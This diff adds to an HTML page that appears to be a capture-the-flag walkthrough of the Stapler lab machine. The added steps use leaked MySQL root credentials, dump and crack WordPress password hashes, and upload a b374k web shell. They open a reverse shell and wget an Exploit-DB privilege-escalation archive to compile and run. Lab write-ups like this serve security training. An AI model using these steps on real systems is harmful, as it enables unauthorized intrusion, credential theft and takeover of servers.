@@ -81,7 +81,50 @@ We were able to post on the blog with entering this url:</p>
 <p><img alt="" src="images/StaplerPics/10_img_error.png" /></p>
 <p>So to be able to read the content lets download it with curl:</p>
 <p><img alt="" src="images/StaplerPics/11_wp_conf_dl.png" /></p>
-<p>MYSQL credentials: <strong>root:plbkac</strong></p>                </article>
+<p>MYSQL credentials: <strong>root:plbkac</strong></p>
+<p>Connect to the target on port 3306 mysql:</p>
+<div class="highlight"><pre><span></span>mysql --user=root --password=plbkac -h 10.0.0.142
+</pre></div>
+
+
+<p>The databases on the target:</p>
+<p><img alt="" src="images/StaplerPics/12_databases.png" /></p>
+<div class="highlight"><pre><span></span>use wordpress;
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>show tables;
+</pre></div>
+
+
+<p><img alt="" src="images/StaplerPics/12_1_wp_tables.png" /></p>
+<div class="highlight"><pre><span></span>select * from wp_users;
+</pre></div>
+
+
+<p><img alt="" src="images/StaplerPics/13_wp_users.png" /></p>
+<p>Ok now we have the hashes of all users on the wordpress blog. It's time to crack
+them. After a while we got the admin account of john:</p>
+<p><img alt="" src="images/StaplerPics/14_john.png" /></p>
+<p><img alt="" src="images/StaplerPics/15_web_admin.png" /></p>
+<p>We can't install plugin on the wp blog because we need ftp credentials.</p>
+<p><img alt="" src="images/StaplerPics/16_cant_upload.png" /></p>
+<p>Despite the error and the fact we haven't the ftp credentials of john our atempt
+to upload b374k shell as plugin ended up uploaded in the media dir:</p>
+<p><img alt="" src="images/StaplerPics/17_media.png" /></p>
+<p>Now we have shell access to the target:</p>
+<p><img alt="" src="images/StaplerPics/18_shell.png" /></p>
+<p>Start reverse shell from b374k to our attacker machine:</p>
+<p><img alt="" src="images/StaplerPics/19_start_reverse_shell.png" /></p>
+<p>Catch the reverse shell and find out whoami and operation system version:</p>
+<p><img alt="" src="images/StaplerPics/20_catch_shell.png" /></p>
+<p>For ubuntu 16.04 there is privelege escalation exploit:</p>
+<div class="highlight"><pre><span></span>wget https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
+</pre></div>
+
+
+<p>After compile and execute the exploit:</p>
+<p><img alt="" src="images/StaplerPics/21_flag.png" /></p>                </article>
             </aside><!-- /#featured -->
                 <section id="content" class="body">
                     <h1>Other articles</h1>
